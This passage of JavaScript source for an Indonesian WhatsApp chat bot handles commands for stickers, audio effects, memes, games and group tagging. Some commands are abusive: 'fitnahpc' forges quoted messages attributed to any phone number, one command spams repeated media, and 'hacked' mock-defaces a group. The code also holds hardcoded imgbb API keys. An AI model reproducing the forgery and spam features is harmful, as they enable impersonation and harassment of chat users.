	            mediat = await Bambang.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Bambang.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await Bambang.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  Bambang.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	  					case 'caripesan':
if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await Bambang.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
Bambang.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hi|15`)
}
break
 case 'slot':
            case 'slots':
                const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            Bambang.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: ftrol })
            break
            case 'suit':
                if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
				case 'robot':
				//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await Bambang.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply('Ulangi Kak Tadi Error')
hah = fs.readFileSync(ran)
Bambang.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await Bambang.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					Bambang.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'hacked':
                 if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.bodmin)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   Bambang.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                Bambang.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                Bambang.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                Bambang.sendMessage(from, 'Succes Hacked', text, {quoted: ftrol})
					break
					case 'fitnahpc':
              if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    Bambang.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
					case 'kontak':
              if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
              if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'resetlinkgroup':
         case 'revoke':
                if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.bodmin)
          json = ['action', 'inviteReset', from]
         Bambang.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
         case 'sticktag':
              if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await Bambang.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./sticker/${wanu[1]}.webp`)
				Bambang.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
				case 'totag':
              if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Bambang.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Bambang.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Bambang.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
case 'balik':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await Bambang.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
Bambang.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':     
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})            
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await Bambang.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalimek=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Bambang.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break    
				
				    
//═════════════════════════ [ CONVERT MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════


       case 'tourl':
       //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await Bambang.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('kirim/reply gambar/video')
}
               break
       case 'imgtourl':
       case 'img2url':
       //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
               reply(mess.wait) 
               var imgbb = require('imgbb-uploader')
               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               var media = await  Bambang.downloadAndSaveMediaMessage(encmedia)       
               imgbb('39d895963468b814fad0514bd28787e2', media)
              .then(data => {
               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(media)
               Bambang.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
})
              .catch(err => {
               throw err
})
               break
        case 'tovideo':
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               reply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Bambang.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Bambang.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               break
            case 'tomp3':
            //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
         //   if (!isPremium) return reply (mess.only.premium)
					Bambang.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await Bambang.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply('Ulangi Kak Tadi Error')
						mhee = fs.readFileSync(ran)
						Bambang.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
    case 'potomeme': case 'pmeme':
    //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
           if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
           if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
           try {
           if (!isQuotedImage && !isQuotedSticker) return reply(`REPLY GAMBAR ATAU STICKER!!`)
           reply(mess.wait)
           var teks11 = q.split('|')[0] ? q.split('|')[0] : ''
           var teks22 = q.split('|')[1] ? q.split('|')[1] : ''
           var imgbb = require('imgbb-uploader')
           var enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
           var media = await Bambang.downloadAndSaveMediaMessage(enmedia)
           var njay = await imgbb('520bd6f6209077d1777c2a4f20c509c2', media)
           var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks11}/${teks22}.png?background=${njay.display_url}`)
           Bambang.sendMessage(from, resu, image, {quoted: mek})
           fs.unlinkSync(media)
           } catch (e) {
           return reply(`${e}`)
           console.log(e)
           }
           break    
     case 'smeme': case 'stickmeme': case 'sm': 
     //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
     {
           var top = q.split('|')[0] ? q.split('|')[0] : ''
           var bottom = q.split('|')[1] ? q.split('|')[1] : ''
           reply(mess.wait)
           var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
           ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           owgi = await  Bambang.downloadAndSaveMediaMessage(ger)
           anu = await imgbb("f0b190d67308d34811fab9c56fe8aba7", owgi)
           tekks = `${anu.display_url}`
           ranp = getRandom('.gif')
           rano = getRandom('.webp')
           anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
           sendWebp(from, `${anu1}`)
           } else {
           reply('Gunakan foto!')
           } 
           }
           break
				case 'stiker': 
				case 'sticker':
				case 's':
            //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Bambang.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Succes Gan')
								buffer = fs.readFileSync(ran)
								Bambang.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Bambang.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								Bambang.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
						reply(`Kirim gambar/video/gif dengan caption \n${prefix}sticker (durasi sticker video 1-9 detik)`)
					}
					break
                  case 'toimg':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			     	if (!isQuotedSticker) return reply('Reply/tag sticker !')
			     	reply (mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Bambang.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Eror Kak')
						buffer = fs.readFileSync(ran)
						Bambang.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih kak... '})
						fs.unlinkSync(ran)
					})
					break
        case 'togif':
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               reply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Bambang.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Bambang.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               break
            case 'stickergif':
			case 'stikergif':
			case 'sgif':
			            //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Bambang.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.stick)
							})
							.on('end', function () {
								console.log('Subrek Fernamek')
								buffer = fs.readFileSync(ran)
								Bambang.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await Bambang.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(`Wait Kak ${pushname}`)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								Bambang.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker atau reply/tag gambar`)
					}
					break  
					

//═════════════════════════ [ MAKER MENU ] ═════════════════════════
//═════════════════════════ [ BY NAYLA / RIMURUBOTZ ] ═════════════════════════
//═════════════════════════ [ NAYLA API ] ═════════════════════════					

		case 'rainbow': case 'scfi': case 'blue': case 'juice': case 'purple': case 'toxic': case 'peridot': case 'metal': 
			case 'realistic': case 'impressive': case 'cracked': case 'magma': case 'thunder': case 'berry': case 'transformer': 
			case 'horror': case 'metallic': case 'circuit': case 'sketch': case 'halloween': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (!q) return
			reply(mess.wait)						
			nyz5 = await fetchJson(`https://myselfff.herokuapp.com/docs/textpro/${command}?text=${q}`) 
			nyz4 = await getBuffer(nyz5.result)
			Bambang.sendMessage(from, nyz4, image, {caption:`SUCCES✔️`,quoted:mek}) 					
			break

//═════════════════════════ [ ANIME MENU ] ═════════════════════════
//═════════════════════════ [ BY NAYLA / RIMURUBOTZ ] ═════════════════════════
//═════════════════════════ [ NAYLA API ] ═════════════════════════					

		    case 'zoro': case 'luffy': case 'sanji': case 'ussop': case 'nami': case 'copper': case 'naruto': case 'minato': case 'sasuke': case 'sakura': case 'boruto': case 'sarada': case 'mitsuki': case 'orochimaru': case 'tsunade': case 'kakashi': case 'killua': case 'gon': case 'saitama': case 'rimuru': case 'sagiri': case 'natsu': case 'tanjirou': case 'nezuko': case 'senku':   
		    //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
            reply(mess.wait)
            nyz5 = await fetchJson(`https://myselfff.herokuapp.com/docs/anime?query=${command}`)
            nyz6 = await getBuffer(nyz5.result.list)
            Bambang.sendMessage(from, nyz6, image, {quoted: mek})
            break

//═════════════════════════ [ OTHER MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════


                    case 'admin':  
         	        case 'owner':  
         	        case 'creator':      
         	        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})     	        		
		            const icontact = fs.readFileSync('./media/contact.jpg')
                    Bambang.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
                    Bambang.sendMessage(from, icontact, image, {quoted: mek, caption: 'Tuhh Kak Kontak Owner Ku >_<'})
					break
case 'grubbot':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
gcm =`
Grub 1 : ${GrubBot}
Grub 2 : ${GrubBot2}
Jangan Lupa Join Yahh *${pushname}*
`
reply(gcm)
break
case 'script':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
const isc = fs.readFileSync('./media/sc.jpg')
mastahb =`*SCRIPT ${NamaBot}*

Script Ori : Bambang
Recode1 : Bambang
Recode2 : ${NamaOwner}

Link Script : https://github.com/Bambang-Gans/btrv3
`
Bambang.sendMessage(from, isc, image, {quoted: mek, caption: mastahb})
break
case 'donasi':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
dona = fs.readFileSync('./media/donasi.jpg')
doni =`*╭─❒ 「 Donasi 」 ──────*
*│*
*│*⬡ *Mau donasi Kah?🤗*
*│*⬡ *GOPAY     :  ${NomorGopay}*
*│*⬡ *DANA    : ${NomorDana}*
*│*⬡ *OVO    : ${NomorOvo}*
*└───────────────────*
1Perak Donasi Kalian Juga Membantu Perkembangan Bot Kami:)`
Bambang.sendMessage(from, dona, image, { quoted: floc3, thumbnail: dona, caption: doni })
break
      case 'runtime':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        run = process.uptime()
        teks = `${kyun(run)}`
        reply(teks)
        break
      case 'speed':
      case 'ping':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8")
          const ssd = child.replace(/Memory:/, "Ram:")
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`
          reply(pingnya)
        })
        break
      case 'delete':
      case 'del':
					case 'd':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					//if (!isOwner)return reply(mess.only.owner)
					//if (!isGroup)return reply(mess.only.group)
				if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
					Bambang.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
              case 'afk': 
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroup) return reply(mess.only.group)
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
